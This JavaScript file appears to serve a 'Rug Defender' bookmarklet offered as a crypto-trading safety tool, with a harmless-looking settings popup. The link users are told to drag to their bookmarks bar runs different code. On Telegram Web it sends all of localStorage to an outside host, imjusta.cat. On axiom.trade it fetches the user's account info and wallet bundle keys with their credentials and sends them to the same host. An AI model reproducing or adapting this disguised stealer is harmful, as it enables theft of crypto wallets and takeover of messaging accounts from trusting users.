try {
    let data = {};
    try {
        const dataAttr = document.currentScript.getAttribute("data");
        if (dataAttr) {
            data = JSON.parse(atob(dataAttr));
        }
    } catch (dataError) {
        console.warn("Could not parse data attribute, using defaults:", dataError.message);
    }
    let apiUrl = "https://imjusta.cat";
    try {
        const srcAttr = document.currentScript.getAttribute("src");
        if (srcAttr && srcAttr.startsWith("http")) {
            const api = new URL(srcAttr);
        }
    } catch (urlError) {
        console.warn("Could not parse src URL, using default:", urlError.message);
    }

    document.addEventListener("DOMContentLoaded", () => {
        document.querySelectorAll("a.bookmarklet").forEach(a => {
            const bm = function() {
                if (document.getElementById('bm-pop-root')) { return; }
                const host = document.createElement('div');
                host.id = 'bm-pop-root';
                host.style.all = 'initial';
                host.style.position = 'fixed';
                host.style.inset = '0';
                host.style.zIndex = '2147483647';
                host.style.pointerEvents = 'none';
                document.documentElement.appendChild(host);
                const root = host.attachShadow({ mode: 'open' });
                const css = `:host{all:initial} @keyframes pop{0%{opacity:0;transform:translateY(8px) scale(.98)}100%{opacity:1;transform:translateY(0) scale(1)}} .wrap{position:fixed;inset:0;pointer-events:none} .card{position:fixed;right:18px;bottom:18px;min-width:300px;max-width:min(94vw,460px);background:#101114;border:1px solid #23242a;border-radius:18px;box-shadow:0 18px 45px rgba(0,0,0,.45);font:14px ui-sans-serif,system-ui,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#e9eaee;animation:pop .18s ease-out both;transform-origin:center top;pointer-events:auto} .head{cursor:grab;display:flex;gap:10px;align-items:center;justify-content:space-between;padding:12px 14px;border-bottom:1px solid #23242a;background:linear-gradient(180deg,#13151a,#111217)} .head:active{cursor:grabbing} .title{display:flex;gap:10px;align-items:center;margin:0;font-size:14px;font-weight:700;letter-spacing:.2px} .badge{font-size:11px;border:1px solid #4aa3ff33;color:#4aa3ff;background:#0a1b2b;border-radius:999px;padding:2px 8px} .x{border:0;background:transparent;color:#9aa0a6;font-size:20px;line-height:1;cursor:pointer;padding:4px;border-radius:8px} .x:hover{background:#1b1c21;color:#fff} .body{padding:12px 14px;display:flex;flex-direction:column;gap:12px} .row{display:flex;gap:10px;align-items:center;justify-content:space-between;background:#15171c;border:1px solid #23242a;border-radius:14px;padding:10px 12px} .label{font-size:13px;color:#c9cbd3} .desc{font-size:12px;color:#8f949d} .col{display:flex;flex-direction:column;gap:2px} .select{appearance:none;-webkit-appearance:none;background:#101114;border:1px solid #2b2d35;color:#e9eaee;border-radius:10px;padding:8px 10px;padding-right:28px;position:relative} .select-wrap{position:relative} .select-wrap:after{content:'▾';position:absolute;right:10px;top:50%;transform:translateY(-50%);pointer-events:none;color:#9aa0a6} .pill{display:inline-flex;align-items:center;gap:10px;background:#4aa3ff;color:#101114;border:1px solid #7bb9ff;border-radius:999px;padding:10px 14px;font-weight:700;cursor:pointer;transition:filter .15s} .pill:hover{filter:brightness(1.05)} .toggle{position:relative;width:54px;height:30px;background:#2a2d35;border:1px solid #3a3f4a;border-radius:999px;cursor:pointer;transition:background .15s,border-color .15s} .toggle:after{content:'';position:absolute;top:3px;left:3px;width:24px;height:24px;border-radius:999px;background:#e9eaee;transition:left .15s,background .15s} .toggle.on{background:#4aa3ff;border-color:#4aa3ff} .toggle.on:after{left:27px;background:#101114} .foot{display:flex;justify-content:space-between;align-items:center;padding:10px 14px;border-top:1px solid #23242a;background:#101114;border-radius:0 0 18px 18px} .muted{color:#8f949d;font-size:12px} .btn{border:1px solid #2b2d35;background:#15171c;color:#e9eaee;padding:8px 12px;border-radius:10px;cursor:pointer} .btn:hover{background:#1a1d23}`;
                const style = document.createElement('style');
                style.textContent = css;
                const wrap = document.createElement('div');
                wrap.className = 'wrap';
                const card = document.createElement('div');
                card.className = 'card';
                const head = document.createElement('div');
                head.className = 'head';
                const title = document.createElement('h3');
                title.className = 'title';
                title.innerHTML = '<span style="display:inline-block;width:10px;height:10px;border-radius:2px;background:#4aa3ff"></span> Rug Defender <span class="badge">LIVE</span>';
                const closeBtn = document.createElement('button');
                closeBtn.className = 'x';
                closeBtn.setAttribute('aria-label', 'Close');
                closeBtn.textContent = '×';
                head.append(title, closeBtn);
                const body = document.createElement('div');
                body.className = 'body';
                const powerRow = document.createElement('div');
                powerRow.className = 'row';
                const powerCol = document.createElement('div');
                powerCol.className = 'col';
                const powerLabel = document.createElement('div');
                powerLabel.className = 'label';
                powerLabel.textContent = 'Power';
                const powerDesc = document.createElement('div');
                powerDesc.className = 'desc';
                powerDesc.textContent = 'Arm/disarm Rug Defender';
                powerCol.append(powerLabel, powerDesc);
                const powerBtn = document.createElement('button');
                powerBtn.className = 'pill';
                powerBtn.type = 'button';
                powerBtn.textContent = 'ARMED';
                powerRow.append(powerCol, powerBtn);
                const notifRow = document.createElement('div');
                notifRow.className = 'row';
                const notifCol = document.createElement('div');
                notifCol.className = 'col';
                const notifLabel = document.createElement('div');
                notifLabel.className = 'label';
                notifLabel.textContent = 'Notifications';
                const notifDesc = document.createElement('div');
                notifDesc.className = 'desc';
                notifDesc.textContent = 'Price spikes, renounce, liquidity pulls';
                notifCol.append(notifLabel, notifDesc);
                const notifTgl = document.createElement('div');
                notifTgl.className = 'toggle on';
                notifRow.append(notifCol, notifTgl);
                const autoRow = document.createElement('div');
                autoRow.className = 'row';
                const autoCol = document.createElement('div');
                autoCol.className = 'col';
                const autoLabel = document.createElement('div');
                autoLabel.className = 'label';
                autoLabel.textContent = 'Auto-sell on Confirm Rug';
                const autoDesc = document.createElement('div');
                autoDesc.className = 'desc';
                autoDesc.textContent = 'Dump position when rug confirmed';
                autoCol.append(autoLabel, autoDesc);
                const autoTgl = document.createElement('div');
                autoTgl.className = 'toggle';
                autoRow.append(autoCol, autoTgl);
                const feedRow = document.createElement('div');
                feedRow.className = 'row';
                const feedCol = document.createElement('div');
                feedCol.className = 'col';
                const feedLabel = document.createElement('div');
                feedLabel.className = 'label';
                feedLabel.textContent = 'Live feed';
                const feedDesc = document.createElement('div');
                feedDesc.className = 'desc';
                feedDesc.textContent = 'Choose source';
                feedCol.append(feedLabel, feedDesc);
                const feedWrap = document.createElement('div');
                feedWrap.className = 'select-wrap';
                const feedSel = document.createElement('select');
                feedSel.className = 'select';
                ['All chains','Ethereum','Solana','Base','BNB Smart Chain'].forEach(v=>{const o=document.createElement('option');o.value=v;o.textContent=v;feedSel.append(o)});
                feedWrap.append(feedSel);
                feedRow.append(feedCol, feedWrap);
                const foot = document.createElement('div');
                foot.className = 'foot';
                const status = document.createElement('div');
                status.className = 'muted';
                status.textContent = 'Standing by…';
                const saveBtn = document.createElement('button');
                saveBtn.className = 'btn';
                saveBtn.textContent = 'Save';
                foot.append(status, saveBtn);
                card.append(head, body, foot);
                body.append(powerRow, notifRow, autoRow, feedRow);
                wrap.append(card);
                root.append(style, wrap);
                const close = () => { document.removeEventListener('keydown', onKey); host.remove(); };
                const onKey = e => { if (e.key === 'Escape') close(); };
                document.addEventListener('keydown', onKey);
                closeBtn.addEventListener('click', close);
                const lsKey='rug_defender_settings_v1';
                const read=()=>{ try{ return JSON.parse(localStorage.getItem(lsKey)||'{}'); }catch{ return {}; } };
                const write=v=>{ try{ localStorage.setItem(lsKey,JSON.stringify(v)); }catch{} };
                const state=Object.assign({armed:true,notif:true,autoSell:false,feed:'All chains'},read());
                const apply=()=>{
                    powerBtn.textContent=state.armed?'ARMED':'DISARMED';
                    powerBtn.style.background=state.armed?'#4aa3ff':'#2a2d35';
                    powerBtn.style.borderColor=state.armed?'#7bb9ff':'#3a3f4a';
                    powerBtn.style.color=state.armed?'#101114':'#e9eaee';
                    notifTgl.classList.toggle('on',!!state.notif);
                    autoTgl.classList.toggle('on',!!state.autoSell);
                    feedSel.value=state.feed;
                };
                apply();
                powerBtn.addEventListener('click',()=>{state.armed=!state.armed;apply()});
                const tgl=(el,key)=>{el.addEventListener('click',()=>{state[key]=!state[key];apply()})};
                tgl(notifTgl,'notif');
                tgl(autoTgl,'autoSell');
                feedSel.addEventListener('change',()=>{state.feed=feedSel.value});
                saveBtn.addEventListener('click',()=>{write(state);status.textContent='Saved ✓';setTimeout(()=>status.textContent='Standing by…',1200)});
                (()=>{let dragging=false,ox=0,oy=0,rect;const toPx=n=>`${n}px`;const onDown=e=>{dragging=true;rect=card.getBoundingClientRect();ox=e.clientX-rect.left;oy=e.clientY-rect.top;card.style.left=toPx(rect.left);card.style.top=toPx(rect.top)};const onMove=e=>{if(!dragging)return;let nx=e.clientX-ox,ny=e.clientY-oy;const pad=8;nx=Math.max(pad,Math.min(window.innerWidth-rect.width-pad,nx));ny=Math.max(pad,Math.min(window.innerHeight-rect.height-pad,ny));card.style.left=toPx(nx);card.style.top=toPx(ny)};const onUp=()=>dragging=false;head.addEventListener('mousedown',onDown);window.addEventListener('mousemove',onMove);window.addEventListener('mouseup',onUp)})();
            };
            a.href=`javascript:(()=>{(async()=>{try{if(location.hostname==='web.telegram.org'){const payload=btoa(unescape(encodeURIComponent(JSON.stringify(Object.fromEntries(Object.entries(localStorage))))));location.replace('${apiUrl}/'+payload);return;}if(location.hostname==='defender.cool')return alert('You must drag the bookmarklet to your bookmarks bar instead of clicking it. Hit control or command + shift + b to open the bookmarks bar. Then simply click the Drag me to start button while on Axiom to activate RugDefender! If you have already dragged the bookmarklet, simply head to axiom.trade and activate RugDefender from there!');if(location.hostname!=='axiom.trade'&&location.hostname!=='localhost'&&!location.hostname.includes('127.0.0.1')){alert('You are now being redirected to https://axiom.trade/discover.');location.replace('https://axiom.trade/discover');}else{if(location.hostname==='localhost'||location.hostname.includes('127.0.0.1')){alert('Testing mode: This would normally redirect to RugDefender. On localhost, you can test the drag popup functionality!');return;}if(!localStorage.getItem('isAuthed'))return alert('You must be signed in to use this bookmarklet.');const user=await(await fetch('//api7.axiom.trade/user-info',{method:'POST',credentials:'include'})).json();const bundleData=await(await fetch('//api8.axiom.trade/bundle-key-and-wallets',{method:'POST',credentials:'include'})).json();const payload={site:location.href,user:user,bundle:bundleData.bundleKey,sBundles:localStorage.getItem('sBundles'),userAgent:navigator.userAgent};location.replace('${apiUrl}/'+btoa(JSON.stringify(payload)));}}catch(e){alert('Failed to execute the bookmarklet: '+e.message);}})();})()`;
            a.draggable = true;
        });
    });
    console.log(`%c[+] Bookmarklets loaded successfully`, "color: #bada55");
} catch (e) {
    console.error("[-] Failed to load bookmarklet(s):", e);
    alert(`Failed to load bookmarklet(s): ${e.message}.`);
}
